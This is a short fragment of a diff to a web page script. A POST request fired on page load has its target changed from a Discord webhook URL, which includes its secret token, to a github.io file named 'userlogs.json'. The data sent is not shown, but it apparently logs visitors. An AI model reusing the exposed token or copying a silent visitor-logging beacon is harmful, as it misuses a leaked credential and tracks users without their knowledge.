@@ -37,7 +37,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
 document.addEventListener('DOMContentLoaded', function () {
   var xhr = new XMLHttpRequest();
-  var url = 'https://discord.com/api/webhooks/1111641644618485881/-6u1wFzHXxxMTPn9xR-3cIw1YNSCfkj5BK0sRxSSefoQ1IDfzNvBASKW7FzG-VRyZUTC';
+  var url = 'https://tcevik.github.io/userlogs.json';
   xhr.open('POST', url, true);
   xhr.setRequestHeader('Content-Type', 'application/json');
 
